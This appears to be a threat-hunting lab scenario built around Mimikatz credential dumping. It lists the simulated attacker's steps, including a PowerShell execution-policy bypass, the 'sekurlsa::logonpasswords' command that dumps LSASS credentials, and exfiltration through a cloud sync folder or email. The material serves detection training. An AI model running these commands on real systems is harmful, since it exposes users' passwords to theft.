üîê Threat Event: Unauthorized Credential Dumping
Mimikatz Credential Dumping Executed by Insider
üìå Reason for the Hunt
Unusual system behavior was reported: the Security Operations Center (SOC) observed multiple alerts related to suspicious access of LSASS memory.

In parallel, cybersecurity intelligence reports have highlighted a rise in the use of Mimikatz in the post-exploitation phase of ransomware campaigns.

üîß As a result, management has directed a proactive threat hunt across all endpoints for credential dumping activity.

üß∞ Steps the "Bad Actor" Took to Create Logs and IoCs
Transferred the file Invoke-Mimikatz.ps1 to the desktop of the victim system.

Executed the script via PowerShell using an execution policy bypass:

powershell
Copy
Edit
powershell.exe -ExecutionPolicy Bypass -File .\Invoke-Mimikatz.ps1
Dumped credentials from LSASS memory using:

powershell
Copy
Edit
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
Stored the output in:

plaintext
Copy
Edit
C:\Users\Public\dumped-creds.txt
Exfiltrated the file using a cloud sync folder (e.g., OneDrive) or sent via email.
